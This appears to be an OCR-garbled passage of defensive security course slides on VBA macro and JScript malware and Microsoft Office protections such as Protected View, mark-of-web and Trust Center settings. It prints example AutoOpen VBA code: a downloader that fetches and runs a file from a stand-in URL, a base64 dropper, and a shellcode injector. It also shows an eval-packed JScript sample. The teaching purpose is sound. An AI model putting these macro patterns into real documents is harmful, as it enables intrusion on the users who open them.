The encoding scheme is just an algorithm without encoding key, and it is proprietary to Microsoft. Malware authors occasionally use .vbe scripts to evade detect ion and frustrate analysts. There are tools to decode vbe to vbs, but they often rely on Microsoft' s scripting engine and thus only run on Windows machines.
decode-vbe.py is a pure Python program written by Didier Stevens to decode VBE files (https://blog.didierstevens.com/20 16/03/29/decoding-vbe/).

© 2017 Erik Van Buggenhout & Stephen Sims

145

Visual Basic for Applications (VBA)

M icrosoft·
Visual Basic

Visual Basic for Applications is a VB scripting language embedded in applications like MS Office (Macro's) and other applicat ions like A utoCA D.

With MS O ffice applications, t he VBA code is embedded in a document like a word processor file or a spreadsheet.

VBA is more powerful than VBS because VBA can interface directly with the Windows API
SANS

Visual Basic for Applications (VBA) Because Windows executables (PE files) are more and more blocked at the perimeter ofenterprise networks (for example by the mail server), adversaries have to find other vectors to deliver their payloads. A vector that has become popular again with malware authors is the Microsoft Office document.
Microsoft Office documents (Word text, Excel spreadsheet, PowerPoint slides. . .) not only contain data like text, layout, images. .. but can also contain scripts. Such scripts are written in Visual Basic for Applications. VBA is Microsoft's technolo!,ry to add scripting capabilities to applications. This is not the Windows Script Host, but a completely different engine (and another dialect ofthe Visual Basic language than VBScript) embedded in the application. WSH settings to control script execution have no impact on VBA.
VBA can interact with the document in the MS Office application, and that is the original goal ofYBA. For example, one can create a template for an order form in Word and then write VBA code that will make the order form calculations. Take an order form where the salesperson can select products and their quantities. The salesperson completes the form in Word according to the client's order, and then it executes VBA code that will calculate the subtotals, total and add sales tax. This calculated data is added to the Word document by the VBA code to produce the final order form.
VBA programs are not restricted in their access to the operating system's resources. VBA programs can read and write files, change registry values, launch other programs... all using the same access rights as the user that launched the Word application. Like VBScript, VBA programs can create ActiveX objects (cfr. the downJoader example). VBA, however, is more powerful than VBScript, because it can access the Windows APl directly and (in theory) have the same capabilities as Windows executables (PE files).
Under the "right" circumstances, these scripts can execute automatically upon opening of the document.

146

© 2017 Erik Van Buggenhout & Stephen Sims

Microsoft's Protection Against VBA
Microsoft introduced a new file format for MS Office documents to better protect users from remote code execution attacks.
Protected View is sandboxing technology added to MS Office applications to contain active content and exploits.
Microsoft Trust Center's Macro Settings govern when VBA code gets executed.

Microsoft's Protection against VBA With the introduction of MS Office 2007, Microsoft delivered new technologies aimed at better protecting the user from attacks through documents.
Before MS Office 2007, MS Office documents were stored in a binary file format based on the Compound File Binary Format. This format supports streams of data, and MS Office applications like Word store their data in streams. These streams are composed ofdifferent binary records, all with different fonnats. Parsing the data in the streams to read a document was technically complex, and thus prone to errors, leading to bugs and exploits. The extensions used for this file format are .doc, .xis, .ppt...
With MS Office 2007, Microsoft introduced a new file format based on ZJP compression and XML: The Office Open XML format. Essentially consisting of XML ft!es stored inside a ZIP container, Microsoft eliminated the need for complex binary parsers by adopting a text-based tile format. Together with a new file format, Microsoft introduced new extensions for this file format by adding an x character to the extension: .docx, .xlsx ...
Protected View was introduced with MS Office 20 I0. To contain exploit code from interacting with the resources of the operating system, pult:ntially dangerous documents are opened in a sandbox. This sandbox is restricted from interacting with the resource of the operating system. If a document contains a weaponized exploit, then opening it in the sandbox (the Protected View) contains the exploit code. As a side effect of opening a document in Protected View, active content is not allowed to run.
VBA code in MS Office documents is often referred to as macros. As automatic execution ofVBA code has inherent risks, Microsoft included MS Office with settings to govern VBA code execution. These settings can be found in the Trust Center.

© 2017 Erik Van Buggenhout & Stephen Sims

147

Office File Extensions

l·old·formot.doc
SAN~

"New" Word file
format without VBA

Office File Extensio ns Together with a new file format (Office Open XML), Microsoft introduced new extensions that allow users and systems to immediately distinguish documents with VBA code (macros) and without.
The extensions used for the new file format without VBA code, are derived from the extensions for the old file format with a letter x appended (x refers to XML). Thus .doc becomes .docx, .xis becomes .xlsx ...
The extensions used for the new file fonnat with VBA code, are derived from the extensions for the old file format with a letter m appended (m refers to macros). Thus .doc becomes .docm, .xis becomes .xlsm...
This convention allows for quick triage of documents. An organization could for example setup a mail server rule that .docm attachments are rejected, while .docx attachments are allowed. MS Office does not allow spoofing of the new macro-less extensions: changing the extension ofa .docm file to docx will not allow for the execution ofthe macros. In this case, Word will permanently disable the macros found in the .docx file.
The icons in this slide represent Word documents stored under different formats. These are the icons displayed on Windows IO with MS Office 2016.
The icon at the left is a .doc file: remark the blue letter W with a white background.
The icon in the center is a .docx file: remark the white letter W with a blue background.
And the icon at the right is a .docm file: remark the exclamation mark alerting the user to the presence of macros.

148

© 2017 Erik Van Buggenhout & Stephen Sims

Sandboxing Using Protected View
IMicrosoft Office's Protected View is sandboxing technology introduced with MS Office 20 I 0.
I~o~e_ntially risky documents are opened i~ Protected View, l1m1ttng the attack surface and containing code in a restricted environment.
IDocuments can only be viewed in Protected View, not edited. To edit documents, the user has to leave Prot ected View.
Sandboxing Using Protected View At the end of the 2000's, several user applications with complex parsers were riddled with vulnerabilities. Think of internet browsers, PDF viewers, office applications... To curb the relentless attacks on these applications, software designers introduced sandboxing technology. Realizing that it is impossible to deliver software without bugs (and thus potentially exploitable), even with a secure software development lifecycle, software designers developed technology to contain exploits. In a normal process, when an exploit runs, the code of the exploit is executed by a thread ofthe Windows process. This existing thread uses the process' access token, giving it the same security context as the process. Being a normal process, it has the same access rights as the user who started the process. If exploit code could be made to run with restricted access rights, then exploit code would not be able to access the operating system's resources with the same access level as the user. Sandboxing achieves this by running all potentially vulnerable, complex code ofthe application in a process with lower access rights than the user. Documents opened in Protected View are a lso static: active content does not execute, and the user cannot edit the document. To edit the document, l11e user has to leave Protected View. Leaving Protected View effectively relaunches the MS Office application without a sandbox.

© 2017 Erik Van Buggenhout & Stephen Sims

149

Sandboxing on the Process Level
Broker process
t
Sandboxed process
SANS

The broker process is a process running on Windows. It is the parent process; it starts the sandboxed process.
This process runs wilh nor 11tiil user rights.
This child process is a process running on Windows. It runs with restricted user rights.

Sandboxing on the Process Level A sandboxed application works with 2 Windows processes: a process with nonnal access rights (the broker process) and a process with restricted access rights (the sandboxed process). The broker process starts first and is the parent of the sandboxed process. All parsing and rendering is done in the sandboxed process. !fan exploit activates in the sandboxed process, it will be contained. Due to the restricted access rights of the sandboxed process, the exploit code will not be able to interact with resources ofthe operating system.
Restricting the rights ofthe sandboxed process is done through various technical settings in Windows. It also depends on the version of Windows: generally, the more recent the version of Windows, the more restricting technologies the sandbox will be able to use.
A non-exhaustive list of methods to restrict the rights of the sandbox process: · The sandboxed process runs inside a job with a quota of I for the processes that can run inside that job. Practically, this prevents the sandboxed process to create new processes · The sandboxed process uses a restricted token, with many privileges removed and ACEs set to deny. This prevents the sandboxed process from accessing operating resources like files, processes, registry entry, pipes, ... The sandboxed process runs at a low integrity level. Normal processes run at rnt:<lium integrity level. A process running at low integrity level cannot make any changes to processes and other resources with a higher integrity level
Because sandboxing technologies tend to use the latest Windows security technologies, it is important to use the latest version of Windows and the sandboxed application. For example, integrity levels were introduced in the Windows Vista kernel. A sandboxed application running on Windows XP cannot use integrity levels as a protection mechanism.

150

© 2017 Erik Van Buggenhout & Stephen Sims

Job Quota Example

I!! oolopod.c"".417Proporli"'

-

~ ~~OJ!!!..

ICP/'i1' _ _

~ -

Job

J~N-

I':";~~
Ttweed, 11rn,s

This is an example of a (partially) sandboxed process. Notepad is running inside a job with a job limit of I active process. Because of the job quota, starting a new process (calc.exe in this example) from the notepad.exe process is prevented.

.l!J

c. ~,.,._...,.

c1.l.l!J

Not"""""qucui,.,..w,i.,· ..-lh>.......... ~ c:J·

t"m~...."""''""'______ _ _ _ __,,_,j· · ..!},..- ..
o!.!o!)..}...-.._...._,.,i.._.

Job Quota Example Jobs are Windows objects that contain Windows processes. By default, a Windows process does not run inside a job. Windows processes have to be started or moved inside a job. Jobs can have limits (quotas), for example, the number ofactive processes that can run inside a job.
In the leftmost screenshot above, we see the properties of the notepad.exe process (viewed with Process Explorer). This job has one limit: Active Processes is equal to I. This means that only one process can run inside the job: notepad.exe cannot create any new processes. As exploit code often starts a new process to launch a downloaded executable, this job with a quota will prevent the exploit code from launching its second stage.
In the rightmost example, we can see the effect ofa job quota of l active process: when the notepad.exe process creates a new process (calc.exe), Windows prevents the creation of this new process because the quota of the job would be exceeded.

© 2017 Erik Van Buggenhout & Stephen Sims

151

Protected View Criteria

Trwt Center
Trustod Publishon lru>ted loohom Tru>ted Oocumonb Tru>ted Add-in Catalogs
ActrveX Setting,
Filo Block ~1n9s Pnvocy Option·

X

Protected View

v,,,.,. Protected View opens potentially dan9tr0us files, without ony security prompt, in a rtstncted mode to holp
m,n,mue harm rovour comput0<. Sy d,~bhng Protwed you could be ti<pos,ng your computer 10 possible s«urrty threats. ·
0 Enable Prot·cttd V,tw for files ongmatmg from the !ntunot

0 Enablo Protected vu,w fo, hies located ,n pottnh·Hy un,.,fe la<:·llons ·
v,,,..., 0 Enable Protected for Qutlook attachmMU

Protected view settings

MS Office applications like Word open documents in Protected View depending on the Protected View settings in the Trust Center.

SAN~

Protected View Criteria Protected View is Microsoft's sandboxing technology for MS Office applications. Not all documents are opened in Protected View: one ofthe reasons is that Protected View prohibits editing of documents, hence documents that need to be edited cannot be opened in protected view.
Applications like Word will only open potentially dangerous documents in Protected View. Deciding if a document is potentially dangerous or not, is done based on criteria that can be configured by an administrator or a user.
Practically, MS Office applications classify a document as potentially dangerous based on properties like origin and location. These can be configured in MS Office's Trust Center, in the Protected View tab. By default, documents that come from outside your organization (downloaded from the Internet or Outlook attachments) or are located in untrusted folders (l ike the folders for temporary Internet files) are considered potentially dangerous and will be opened in Protected View.

152

© 2017 Erik Van Buggenhout & Stephen Sims

Leaving Protected View

Tools

demo.doc (Prot«ted V,,,w) - Word

0 Be caR!ful-fil6 from the lnt~net can contain PROTECTED VIEW virU5es. Unlessyou Med to edrt. rt's safer to stay in Protected 1/-.

E~blc Editing

Endold C t ·

Sc1t·n 1 of 1 :)

User awareness
When a Word document is opened in Protected View, the user is informed with a yellow banner at the top of the window.
Protected view has a button to leave Protected View: Enable Editing. By clicking on Enable Editing. Word will be relaunched co open the document without Protected View.

Leaving Protected View A yellow banner at the top ofthe Word window informs the user that a document has been opened in Protected View.
User awareness concerning Protected View is key because the user can decide to leave Protected View by clicking the Enable Editing button. By clicking on the button and leaving protected view, the document is reopened in Word in normal view. This means not only that the document can be edited but also that the document is no longer opened in a sandboxed Word process. If the document contains exploits for (known) Word vulnerabilities, then the malicious exploit code will no longer be contained in the sandbox, and have the same access to operating systems resources like fi les and registry entries as the user.
Active content is also disabled in Protected View. VBA Macros are disabled too, but for potentially dangerous VBA code, there is a second barrier that we will discuss in coming slides.
Malicious Word documents often contain messages with a social engineering aspect to entice the user to disable Protected View by clicking on the Enable Editing button. For example, the Word document will "inform" the user that it contains an "encrypted" message, i.e. that the message is "protected" and that the user needs to unprotected the document to view il.
In other words, the social engineering messages try to confuse the user by amalgamating terms like protected
and encrypted.

© 2017 Erik Van Buggenhout & Stephen Sims

153

Mark-of-Web
_ _ ""'°" _ __ X
r_..·· ..._.WO!d,, 20l)eoa..,.(40c\
- ..., Ill .,.,.io"

Security:

0 O Read-only

Hidden

Advanced ...

Ths fie came from another

D block

cx,mputer and might be blocked to Un

help protect this computer.

~ ~ ~

'l".....,,. . ,on. ,s-a,21:
locs.,S·2Ct7.2~aoo .,...., · · ,011. J50329

-
5-ull)'

·=-..-e::·:.-~~'"'

-
OlHiod

htOe--oc«e--~

SANS

Untrusted locations & mark-of-web
Files that are downloaded from the Internet (for example. with Internet Explorer) are marked as originating from an untrusted location.This so-called mark-of-web can be viewed (and removed) via Windows Explorer's properties dialog box.
To protect your organization, it is important to use applications that support markof-web.

Mark-of-Web As discussed, MS Office applications will open potentially dangerous documents in Protected View. A document is considered potentially dangerous if, for example, it was downloaded from the Internet.
But how can an application like Word detennine that a file was downloaded from the Internet, if it was downloaded via another application, for example fnternet Explorer?
Internet-facing applications like Internet Explorer will mark downloaded files according to their origin. This mark is called a mark-of-web.
ln Windows Explorer, this mark-of-web can be viewed by opening the properties dialog box of the file. For a file with a mark-of-web, the properties dialog box will display a text to infonn that this file came from another computer and that it might be blocked. Remark that the user has the option to unblock the file, i.e. remove the mark-of-web.
The Windows file system itselfwill not actually block the file when it has a mark-of-web (for example with an ACL), rather blocking is left to the discretion ofapplications that open the file and support mark-of-web. MS Office applications like Word support mark-of-web and can be configured to opt:n documents with a mark-ofweb in Protected View.
When selecting applications to use inside one's enterprise, it is important to take into account security features like sandboxes and support for mark-of-web.

154

© 2017 Erik Van Buggenhout & Stephen Sims

Zoneld
; ] demo.docZone.ldentifi,er · Notepad File Edit Format V.t!N Help
![Zone Trans fer] Zoneld·3

Zone identifiers & ADS
Technically. mark-of-web is stored in an Alternate Data Stream with the name
Zone.Identifier.
This ADS contains textformatted-like INI files.
The Zoneld corresponds to the zones defined in Internet Explorer's security settings.

...... ~~ ~ ,.,._

.....~-· ..,_..~_.

·~1---........,,

----

·W'Ol'IOII~~~~

....... -~~.,.._ ~

SAN~
Zo ne l d The mark-of-web data is stored in an Alternate Data Stream ofthe file with the mark-of-web. An ADS is a feature of the NTFS file system . The content of a file can be considered as a data stream. NTFS supports more than one data stream for a file, these extra data streams are called Alternate Data Streams. Alternate Data Streams have a name (just like filenames) and can be accessed by concatenating the name of the file and the name of the ADS separated by a colon character.
The ADS name used for mark-of-web is Zone.Identifier. For example, file demo.doc with a mark-of-web has an ADS with name Zone.Identifier. The content of this ADS can be accessed by using the following name: demo.doc:Zone. Identifier.
Notepad, for example, can be used to view (and modify) this ADS, as shown in this slide: notepad.exe demo.doc:Zone.ldentifier.
As can be seen from the content of the ADS, a mark-of-web is text formatted like an IN! file. The property Zoneld identifies the origin ofthe file. Zoneld 3 corresponds to the Internet Explorer security zone " Internet''.
It is important to understand that mark-of-web is only t:ITt:1,;live if applications that support it arc used and that the NTFS file system is used (only NTFS supports ADS, other fi le systems do not). For example, if a downloaded tile is copied to removable storage (a USB stick) that is formatted with another file system (for example FAT32), then the ADS cannot be copied and the mark-of-web is lost.
For removable storage, other settings in Microsoft Office's Trust Center can be used: trusted locations.

© 2017 Erik Van Buggenhout & Stephen Sims

155

VBA Macros

IBy default, Microsoft Office restricts automatic execution of VBA code.This can however be further configured manually.
IVBA code is embedded inside the Office document, execution of the code can be triggered by different events, for example opening of the document.
IThe VBA programming language is very powerful. It can use ActiveX like VBS does, but also interact directly with the Windows APL

SANS

VBA Macros VBA code can be added to MS Office documents like Word documents. As discussed before, this scripting facility can be useful for example to calculate order forms. But it can also be abused to conduct the initial intrusion into your enterprise.
By default, Microsoft Office applications like Word will not enable VBA code automatically when a document with VBA code is opened for the first time. The user is informed about the presence of macros (VBA code), and the choice to execute macros is left to the user. But once the user has decided to execute macros, the document is considered safe and subsequently Word will always enable macros for this document when it is opened.
VBA code embedded inside Office documents like Word documents consists mainly ofsubroutines and functions and does not execute automatically unless the necessary triggers are coded. For example, one way in Word to achieve code execution upon opening of the document is to create a subroutine with the name AutoOpen. When a subroutine with this name is present, it will be executed when the Word document is opened (and macros have been enabled). There are several ways to achieve automatic execution: another example is upon closing of the document.
The YBA programming language is very powerful because it can also interface directly with the Windows APL This is done through so-called Declare statements. It is unusual for business documents to contain macros that interact with the Windows APL So, the presence ofDeclare statements is a good indicator for potentially malicious documents. And luckily for us, the Declare keyword cannot be obfuscated.

156

© 2017 Erik Van Buggenhout & Stephen Sims

Macro Settings in the Trust Center

Trwt Center Truster! Pubh:.h·n Trusted loutioM Tru>ted Do<um«nts Trusted Add·tn Cotalogs Add-,n,
MeuageS.r F1lt Block Sdllngs Pri"a<yOpuons

X
0 Di>lbl· ·P macros Without n011f,ut,on
@ .Qtsabl· 111 mocros -..,th notmc.hon
0 Oi,abl· .- macros octpl d191t·ify s,gned macro, 0 {Mbl· all moetos (not r«omm,nded; pot·nb4'1y d1ng,rou, cod· un run)
O""dop.,r M· <ro Selling,
0 Trust acc... to th·ll'.8A pro)«I obje<I mod·l

Trust settings
By default, all VBA code (macros) is disabled with notification in MS Office's Trust Center.
Access to the VBA project model is disabled: this prevents selfmodifying code.

Macro Settings in the Trust Center The Macro Settings in MS Office's Trust Center will disable VBA code by default. "Disable all macros with notification" means that the user will be presented with a warning that macros are disabled, and left with the option to enable macros (see next slide for an example).
Other options are to disable macros without any warning, to only enable digitally signed macros, or to enable all macros.
As you can imagine, enabling all macros in today's hostile Internet environment is not a good thing to do: the risk of malicious code execution is too high.
"Disable all macros except digitally signed macros" can be an interesting option for your enterprise, ifyour enterprise needs VBA programming done by the IT department. Then the IT department can digitally sign all VBA code it develops, and the users will not receive warnings about macros developed by the IT department. Digitally signing VBA code is done with a code signing certificate (the same certificate can also digitally sign PE files). This certificate can be purchased, or ifyou have a PKJ infrastructure in your enterprise, issued by the PKJ server.
Remark that adversaries can purchase (or steal) code signing certificates too, so for enhanced protection, it could be interesting to further configure MS Office's Trust Center's settings with the particular certificates (or root CAs) to trust.
The option to access the VBA project model allows adversaries to create polymorphic malwarc: malware that mutates by modifying itself. Microsoft has had particular issues with polymorphic VBA malware in a distant past, and that is why they added this setting which is disabled by default.

© 2017 Erik Van Buggenhout & Stephen Sims

157

Enabling Macro Content

8

0

· n<w form·t wrth-vba docm · Word !!I

-

::J X

hi·

I I I I I l I ; · ·ns~ : ~ L·yo Refe, Ma,h R,v" V,av Dev<

....

C1hbri

· 11

0

8 I .ll · .... X, 11 ' A

~ ~ § :E .

:1 Pa,sto

~ /A· .Y · Jl. · Aa · ,.; A. ~ - _ ·

11

· P. S«Jn ,n

Shore

~J p
SI~ Edrung

Cbpboard r.

font

r,

SEQJRITY WARNING M·m>< hav· i,,.,.,, d""bl.-d

"

Macro content banner
When macros are disabled with notification {the default setting). the user is presented with the following banner.
If the document has a mark-of-web. then the Protected View banner is displayed first.

Page 1 o! 1 0 words (13

· Ill ~ -

+ 100'!.

Enabling Macro Content The default setting "disable all macros with notifications" makes that a yellow banner "SECURITY WARNTNG" is displayed when an MS Office document containing macros is opened. The user has the option to enable macros by clicking the button "Enable Content".
Again, user awareness is key with this banner. Users must be properly trained about the meaning ofthis warning, and know how to inform the proper team inside your enterprise ifthis alert appears with documents originating outside ofyour enterprise.
Once the button Enable Content has been clicked, VBA code is enabled, and ifit contains autorun properties (like AutoOpen), the VBA code will execute after clicking the button. Subsequent openings of the same document will not produce the warning banner, once the button has been clicked.
Remark that ifa document has a mark-of-web, that the document will first be opened in Protected View. If the user clicks on Enable Editing and the document contains macros, then this banner will be presented.
Remember: for document with VBA code originating from the Internet, 2 consecutive warning banners are presented to the user: " Protected View" and "SECURITY WARN ING".

158

© 2017 Erik Van Buggenhout & Stephen Sims

Enabling Macro Content - Adversary Tricks

<.MIOf'I

· u · ,,; ·· 11, · ", :: · I: · '';· !lt llt 1I ~

t'l::. >.,, Jt&,f/Atfr,1t, · I :U ~ .... · · x '

.._.... · ~- A · 1111: · ·

:1· !\· _ ·

. . - <>oabCWc AaBb( AaBbC, AaBb( I

, ,_,.._ fNolf,ao,. t1d~t\11 NOl·'I>

Joe·

oaOffice·

Attermll ~ doc~war. CfU1td bi) - n w:" ' ! . . ~ ~ ~ ~ M>aos n,1,$1Ile en-.f u, dtSP'>'tlllecom<llS o l l l l e -

a o , o. . . .

.... · JU · ···

User awareness...
As the macro restrictions are effective at blocking a number of a«acks, adversaries are including "Macro enabling" guidelines in malicious Office documents they are creating...

Enabling Macro Content - Adversary Tricks As technical controls improve, adversaries are adapting their strategies to target the weakest link: humans.
Malicious documents often contain a socially engineered message to entice users to click on the Enable Content button. Malware authors include a message that explains how and why to enable macros, tricking users into executing the malicious content. However, users should be made aware that the content should not be enabled and the message shown does not mean that the document is encrypted, obfuscated, unreadable, or whatever tenn malware authors use to convey the victim into clicking the button.

© 2017 Erik Van Buggenhout & Stephen Sims

159

I
VBA as a Malware Downloader

- 1 Declare Function URLDownloadToFile Li.b "urlmon" Ali.as "URLOownloodToFi.leA-" (ByVal pCaller As Long,
z Declare Function ShellExecute Lib "shell32.dll" Ali.as "ShellExecuteA" (ByVal hwnd As Long, ByVal 11

3

4 Sub AutoOpen()

s

strURL · "http://example.com/malware.html"

6

strPath - Environ("temp") + "\molware.exe"

7

URLOownloadToFi.le 0, strURL, strPath, 0, 0

8

ShellExecute 0, "open", strPath, "", "", 1

9 End Sub

Like mVBS. downloaders in VBA are popular too. Th,s downloader uses the Windows API (cfr. Declare statements).

SAN~

VBA as a Malware Downloade r Downloaders are popular with malware authors, so just like in YBS, they code downloaders in VBA. This can be done with ActiveX like the example we saw in YBS, or with the Windows API.

This example here uses the Windows API to download a file to disk and execute it.

Lines I and 2 contain Declare statements do define the Windows API functions to be used later in the YBA script. A declare statement needs to specify the name ofthe A Pl function to use, and the dll where it can be found, together with its arguments.

Line I declares function URLDownloadToFile. This is a popular Windows API function (found in DLL urlmon) to download a file via HTTP and write it to disk. Alias URLDownloadToFileA specifies that we want to use the ASCII version ofthis API function: all Windows API functions that take strings as an input or output exist in 2 variants. An ASCII variant (suffix A) and a UNICODE variant (suffix W).

Line 2 declares function ShellExecute: with this function, an executable can be launched.

Lines 4 through 9 define a subroutine with name AutoOpen. As we've learned, AutoOpt:n will execute automatically when the Word document is opened.

As in the YBS example, line 5 defines the URL and line 6 the path (a file in the temporary folder).

L ine 7 calls API function URLDownloadToFile to download a file from the specified URL and save it to disk to the specified path.

Line 8 calls ShellExecute to execute the downloaded file.

This simple example is for 32-bit Word applications. 64-bit is slightly different in the Declare statements. It is
possible to write YBA code that interfaces correctly with both 32-bit and 64-bit Word, but for the sake of simplicity, we do not include it in this example.

160

© 2017 Erik Van Buggenhout & Stephen Sims

VBA as a M alware Dropper

1 Sub AutoOpen()

VBA dropper

2

strPath = Environ("temp") + "\malware.exe"

3

strPayload = Decode64("SGVsbG8gd29ybGQ=")

Another popular form of

4

malware used with

----

5

1F1leNumber = FreeFile

6 Open strPath For Binary As #iFileNumber

7

Put #iFileNumber, , strPayload

scripting is the dropper.
The dropper also writes a payload to disk and

8

Close #iFileNumber

executes it, but contrary

9

10

Set oShell = CreateObject("shell.application")

11 oShell. ShellExecute strPath, '"' , "", "open", 1

12 End Sub

to the downloader. it does not download the payload.
The payload is embedded in the script.

VBA as a Malware Dropper T his example is a dropper: another type of popular, scripted malware. A dropper contains an embedded payload, writes it to disk and executes it.
In this example, subroutine AutoOpen (run automatically when the Word document is opened) contains the payload encoded in BASE64: this can be seen in line 3. BASE64 is a simple way to encode binary data in a form that can be included in a script. BASE64 can take any byte value (0 through 256) and represent it with 64 different printable characters. Since a byte value is 8 bits, and 64 characters is 6 bits, it takes 4 BASE64
characters (4 * 6 = 24 bits) to represent 3 bytes (3 * 8 = 24 bits). This is an overhead of 1/3.
The code in lines 5 through 8 write the decoded payload to disk.
Lines IO and I I execute the payload written to disk with an ActiveX object.
For brevity, the code for function Decode64 is not included. And the payload is very short, it is not a real executable.

© 2017 Erik Van Buggenhout & Stephen Sims

161

Downloaders vs. Droppers
IDownloaders are malicious scripts that download a payload, write it to disk and execute it.
IDroppers are malicious scripts that embed a payload, write it to disk and execute it.
IMore complex malware exists for initial intrusion that does not write a payload to disk.
SANS
Downloaders vs. Droppers The 2 major types of malicious scripts used for initial intrusion are downloaders and droppers. Both variants write a payload to disk prior to execution of the payload. This tactic implies that antivirus products have a chance to detect the payload, or that application whitelisting technology can prevent execution ofthe payload. That is good news for defenders, but not for our adversaries. To avoid detection when writing to disk, they will rely on more sophisticated types of malicious scripts. Shellcode is one solution employed by adversaries to bypass detection. VBA code can embed shellcode Oust like a dropper does), but instead of writing it to disk, shellcode is executed immediately in memory. This prevents anti-virus from detecting the malicious shellcode.

162

© 2017 Erik Van Buggenhout & Stephen Sims

VBA as a Shellcode Injector

1 Private Declare PtrSafe Function CreateThread Lib "kerne132" (ByVal Tvxs As Long, ByVal Fgxcbxxl 2 Private Declare PtrSafe Function Vi.rtualAlloc Li.b "kerne132" (ByVal Xvmr As Long, ByVal Vwpuh As 3 Private Declare PtrSafe Function RtlMoveMemory Li.b "kernel32" (ByVal Eem As LongPtr, ByRef Ijig J

4

5 Sub AutoOpen()

6

Di.m byte As Long, shellcode As Vari.ant, i. As Long

7

Di.m vi.rtualpage As LongPtr, Bi.sowqts As LongPtr

8

shellcode = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,

9

vi.rtuolpoge = Vi.rtualAlloc(0, UBound(shellcode), &H1000, &H40)

10 For i.. LBound(shellcode) To UBound(shellcode)

11

byte= shellcode(i.)

12

Bi.sawqts ~ RtlMoveMemory(vi.rtuolpoge + i., byte, 1)

13

Next i

14

Bi.sawqts = CreateThread(0, 0, vi.rtualpage, 0, 0, 0)

15 End Sub

ThisVBA script is a typical form of shellcode injector. Line 8 contains the shellcode, which is decoded. injected and executed. Complex shellcode exists that performs process hollowing to bypass AV and application whitelisting.
I SAN~

VBA as a S hellcode Injecto r This example ofmalicious VBA code is a shellcode injector. A shellcode injector contains embedded shellcode, decodes it, writes it to process memory (the process hosting the VBA engine in our example, e.g. the Word application) and then executes it.
The shellcode, encoded in line 8 (truncated for brevity) is decoded.
In line 9, API function VirtualAlloc is used to allocate memory to contain the shellcode.
Lines IO through 13 write the shellcode to the allocated memory page (using RtlMoveMemory).
Line 14 executes the shellcode by creating a new thread.
This attack is particularly hard to detect and prevent because no malicious code is written to disk. Behavior monitoring ofthe applications will find it hard too to detect this: using API functions VirtualAlloc, RtlMoveMemory and CreateThread are normal operations within the lifespan of a process.
As we wi ll see later, EMET can detect and prevent the execution ofshellcode.
An example ofsophisticated shellcode that performs process hollowing can be found here: htt.ps:// isc.sans.edu/forums/diary/I lancitor+ Maldoc+ Bypasses+Application+Whitelisting/21683/

© 2017 Erik Van Buggenhout & Stephen Sims

163

JScript (I)

ILike VBScript, JScript is also executed by the Windows Script Host. It can run as a console application or a GUI application.

SA~S

cscript.exe

jscript.dll

wscript.exe

JScript (1) JScript is Microsoft's implementation of ECMAScript/JavaScript.
Like VBScript, JScript is executed by the Windows Script Host. Host applications wscript.exe and cscript.exe can execute JScript, and the JScript engine is implemented in the jscript.dll.
In previous slides, we saw how to detect and prevent YBScript execution. The same techniques apply to JScript too, as our techniques focused on the Windows Script Host.

164

© 2017 Erik Van Buggenhout & Stephen Sims

JScript (2)

IJScript files (with extension .js) are used by attackers like .vbs files: they can be delivered to the victims as e·mail attachments with some social engineering.
ILike VBScript scripts, JScript can create and interact with ActiveX objects. Adversaries use this technology to code downloaders and droppers.
IJScript implements some powerful functions that allow a much higher level of obfuscation than with VBScript.

SANS
JScript (2) Malware authors often attack their victims by e·mailing a .js file (a downloader) as an attachment (or inside an attached Z IP file).
fiake invoices are often the social engineering angle used by attackers: the e-mail content refers to an attached invoice, and when the victim opens the attached .js file (assuming it is an invoice) out ofcuriosity, the downloader executes the second stage of the attack.
Like VBScript, JScript is a powerful language. It can interact with the resources ofthe operating system like files and registry entries, by creating ActiveX objects. Unlike VBA, JScript cannot interact with the Windows API directly by declaring functions. Like with YBScript, this is not possible with JScript.
JScript supports some powerful functions like the eval function. The eval function takes one string as argument and evaluates the string a JScript code. T his allows for the complete obfuscation ofa program structure, including the structure offunction definitions, by storing the complete JScript program in a string and then perform string obfuscation on the argument o f the eval function.
By comparison, this is not possible in YBSc.;ripl, as VBScript lacks the equivalent of the cval function.

© 2017 Erik Van Buggenhout & Stephen Sims

165

JScript Mark-of-Web
tJJ:r,1c

Op,.n file· Stcunty W· rning

X

Oo you w.ant toopM thk fie.?
N,m.: C:\Dtmo\ dffllO.J< Type Jov·Scropl F.te From: C:\Dtmo\ dcmo-J<

SANS

Wht(e ftles ftom the lntttnd. on htuseful th1i hit~ tan potentia1!y
h,nn yow computrr. tfyou do not t:nntthe so~.uct. do notopen this softwa~ . 'I/hat'; tbt,ni.~

M ark-of-web JScript
A downloaded JScript file will have a mark-of-web provided the right applications are used (like Internet Explorer).
When a ]Script file is opened (double-clicked), it is immediately executed, except when it has a mark-of-web. In that case. the warning on the left is first displayed.

JScript Mark-of-Web The mark-of-web we saw for MS Office documents applies to all downloaded content, provided the applications that are used for downloading (like Internet Explorer) support mark-of-web.
In an e-mail attack, the user is social-engineered into saving and opening the attached .js file. Like .vbs files, .js files are executed immediately when they are opened, for example by double-clicking them in Windows Explorer.
If the .js file has a mark-of-web, then the JScript will not execute immediately. The user is presented first with a warning dialog box, informing the user of the potential dangers offiles originating from the Internet, and giving the user a choice to open the file or not. Cancel is the default operation.
To prevent these kinds ofattacks, mark-of-web together with user awareness is key. Users must be informed about the meaning of this Security Warning dialog, and be told about the risks ofscripted malware. This will train users in proper handl ing ofthese alerts, instead ofjust ignoring the alert.
The same applies to YBScript: when a .vbs file with mark-of-web is opened, a security dialog is presented to the user prior to execution.
Mark-of-web also explains why malicious scripts are delivered inside a Z IP file: some Z IP applications do not propagate the mark of web. This means that the attached ZIP file, saved to disk, has a mark-of-web, but when the contained files are extracted, they are not tagged with a mark-of-web.

166

© 2017 Erik Van Buggenhout & Stephen Sims

JScript Obfuscation
eval(function(p,a,c,k,e,r)(e" String;if(l''.replace<r/,String)J(while(c··Jr{cJ· k(clllc;k· {function(el{retum r(eJ}J;eefunction(){return'\\w+1;c· 1};while(c--Jif(k[cl)p· p.replace(new
RegExp('\\b'+e(c)+'\\b','g'),k[cl);return p}('(00(4 1-·s 6 7 s·;o 2(31(9(3))2(11))
();',10,10,'functionlblsomethinglatvarfsomelsampletpackedlcodetalcrt'.split(' l'J,0,0))
UnPack Clear
(f u n c ti on() ( var b="some sample packed code ·; function somethlng(a) ( alert(aJ } something(bl
}
.l.Q;_ ___

Eva) obfuscation This is an example of obfuscated JavaScript code using the eval function.
Deobfuscation This is the deobfuscated JavaScript code.

JScript Obfuscation ECMAScript and thus JScript and JavaScript all implement the eval function.
